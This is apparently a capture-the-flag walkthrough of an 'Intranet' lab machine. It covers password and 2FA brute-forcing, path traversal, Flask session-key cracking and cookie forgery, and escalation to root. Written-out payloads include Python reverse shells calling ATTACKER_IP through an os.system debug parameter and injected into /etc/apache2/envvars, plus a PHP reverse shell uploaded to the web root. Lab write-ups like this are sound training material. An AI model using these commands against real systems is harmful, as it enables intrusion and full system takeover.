# Intranet

**Difficulty:** Medium

## Reconnaissance

I began by running an nmap scan to identify open ports on the target server:
```bash
sudo nmap -sC -A -p- -oN nmap.txt intranet.thm -T4
```

The scan revealed several interesting services:
```
PORT     STATE SERVICE    VERSION
7/tcp    open  echo
21/tcp   open  ftp        vsftpd 3.0.5
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 5e:68:d0:10:56:8c:72:24:9f:3f:30:a6:29:a4:04:6b (RSA)
|   256 ac:11:f7:0e:03:c1:9f:fb:70:c6:a3:7a:1e:81:25:a2 (ECDSA)
|_  256 5a:28:cc:43:83:05:05:b7:3b:23:7c:bb:75:d3:19:db (ED25519)
23/tcp   open  tcpwrapped
80/tcp   open  http       Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.41 (Ubuntu)
8080/tcp open  http       Werkzeug httpd 2.2.2 (Python 3.8.10)
|_http-server-header: Werkzeug/2.2.2 Python/3.8.10
| http-title: Site doesn't have a title (text/html; charset=utf-8).
|_Requested resource was /login
```

After exploring the available ports, I used ffuf to enumerate endpoints on both web applications running on ports 80 and 8080.

**Port 80:**
```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://intranet.thm/FUZZ -e .html,.php
```

The scan revealed only an index.html page displaying a "under construction" message, so I proceeded to enumerate port 8080.

**Port 8080:**
```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://intranet.thm:8080/FUZZ -e .html,.php
```
```
admin                   [Status: 302]
application             [Status: 403]
external                [Status: 302]
home                    [Status: 302]
internal                [Status: 302]
login                   [Status: 200]
logout                  [Status: 302]
robots.txt              [Status: 200]
sms                     [Status: 302]
temporary               [Status: 403]
```

## Initial Access via Login Page

Upon examining the login page and its source code, I discovered an email address: `devops@securesolacoders.no`. The application's verbose error messages confirmed this email was registered in the system. I attempted to brute-force the password using Hydra:
```bash
hydra -l devops@securesolacoders.no -P /usr/share/wordlists/rockyou.txt intranet.thm http-post-form "/login:username=^USER^&password=^PASS^:Invalid password" -VI -T 64 -s 8080
```

After running for some time without success, I encountered a new error message:
```
Error: Hacking attempt detected! You have been logged as 192.168.128.124. (Detected illegal chars in password).
```

This indicated the application was filtering certain characters. I pivoted to enumerating additional usernames:
```bash
hydra -L /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -p test intranet.thm http-post-form "/login:username=^USER^@securesolacoders.no&password=^PASS^:F=Invalid username" -VI -T 64 -s 8080 -o users.txt
```

This revealed two valid usernames:
```
[8080][http-post-form] host: intranet.thm   login: admin   password: test
[8080][http-post-form] host: intranet.thm   login: anders   password: test
```

Standard wordlists failed to crack these accounts, so I generated a custom wordlist using cewl to scrape the website's content, then applied John the Ripper's rules for mutations:
```bash
cewl http://intranet.thm:8080/login -w password.txt

john --wordlist=password.txt --rules=jumbo --stdout > passlist.txt

hydra -L users.txt -P passlist.txt intranet.thm http-post-form "/login:username=^USER^@securesolacoders.no&password=^PASS^:F=Invalid password" -VI -T 64 -s 8080 -f -u
```
```
[8080] host: intranet.thm   login: anders@securesolacoders.no   password: REDACTED
```

Successfully logging in with these credentials revealed the first flag. However, access required bypassing a 2FA mechanism with a 4-digit code.

## Bypassing 2FA

Since the 2FA endpoint wasn't rate-limited, I used ffuf to brute-force the 4-digit code:
```bash
ffuf -w /usr/share/seclists/Fuzzing/4-digits-0000-9999.txt -u http://intranet.thm:8080/sms -X POST -H "Cookie: session=eyJ1c2VybmFtZSI6ImFuZGVycyJ9.aU2HQg.XNWCf8XpUSqPQ-Tp81YrL5OKoCo" -H "Content-Type: application/x-www-form-urlencoded" -d "sms=FUZZ" -fs 1326
```
```
2713                   [Status: 302]
```

## Exploiting Path Traversal

While exploring the application, I discovered a news update feature that accepted a `news` parameter. Testing revealed it was vulnerable to path traversal:
```bash
news=../../etc/passwd
```

This successfully retrieved the system's password file. After experimenting with various payloads, I discovered that using `/proc/self/cwd` revealed the Flask application's source code and the third flag:
```bash
news=../../proc/self/cwd/app.py
```

## Privilege Escalation to Admin

Analysis of the Flask application's source code revealed that the JWT secret key follows a predictable pattern:
```python
key = "secret_key_" + str(random.randrange(100000,999999))
```

I generated a wordlist containing all possible secret keys and used flask-unsign to brute-force the actual key:
```bash
python3 -c 'for i in range(100000, 1000000): print(f"secret_key_{i}")' > flask_secrets.txt

flask-unsign --unsign --cookie "eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYW5kZXJzIn0.aU2Otw.SEMmEDHYCwSxcozifQg__DTasVg" --wordlist flask_secrets.txt --no-literal-eval
```
```
[*] Session decodes to: {'logged_in': True, 'username': 'anders'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 151296 attempts
b'secret_key_REDACTED'
```

With the recovered secret key, I forged an admin session token:
```bash
flask-unsign --sign --cookie "{'logged_in': True, 'username': 'admin'}" --secret "secret_key_REDACTED"
```

Replacing my session cookie with the forged token granted admin privileges and revealed the fourth flag.

## Gaining Initial Shell Access

Further examination of the application's source code revealed that the admin panel accepts POST requests with a `debug` parameter that executes commands via `os.system()`. Since this function doesn't return output directly, I used it to establish a reverse shell:
```bash
curl -X POST http://intranet.thm:8080/admin \
-H "Cookie: session=REDACTED" \
-d "debug=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ATTACKER_IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'"
```

This granted shell access as the `devops` user, allowing me to retrieve the first user flag:
```bash
cat user.txt 
THM{REDACTED}
```

## Lateral Movement to Anders

After gaining access as devops, I enumerated running processes to identify additional attack vectors:
```bash
ps auxw
```

The output revealed that user `anders` was running an Apache web server:
```
anders 1000 0.0 0.4 193928 8140 ? S 09:44 0:00 /usr/sbin/apache2 -k start
```

Since two web applications were hosted on the system (Apache on port 80 and Werkzeug on port 8080), I decided to leverage the Apache service for lateral movement. I prepared a PHP reverse shell from pentestmonkey's repository:
```bash
# On attack machine
wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
# Edit the file to set ATTACKER_IP and port 443
```

I set up a listener on my attack machine:
```bash
nc -lvnp 443
```

Then, from the devops shell, I navigated to the web root and uploaded the PHP reverse shell:
```bash
cd /var/www/html
wget http://ATTACKER_IP/shell.php
```

Accessing `http://intranet.thm/shell.php` in a browser triggered the reverse shell, granting me access as the `anders` user. I could then retrieve the second user flag.

## Root Privilege Escalation

To identify privilege escalation vectors, I ran linpeas.sh on the target system:
```bash
# On attack machine
python3 -m http.server 8000

# On target (as anders)
cd /tmp
wget http://ATTACKER_IP/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

The enumeration revealed write permissions to `/etc/apache2/envvars`, which is executed as root when Apache restarts. I exploited this by injecting a Python reverse shell into the file:
```bash
echo '/usr/bin/python3 -c '"'"'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",445));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'"'"'' >> /etc/apache2/envvars
```

After setting up a listener on port 445, I restarted the Apache service:
```bash
nc -lvnp 445  # On attack machine

sudo /sbin/service apache2 restart  # On target
```

This granted me a root shell, allowing me to retrieve the final flag and complete the box.
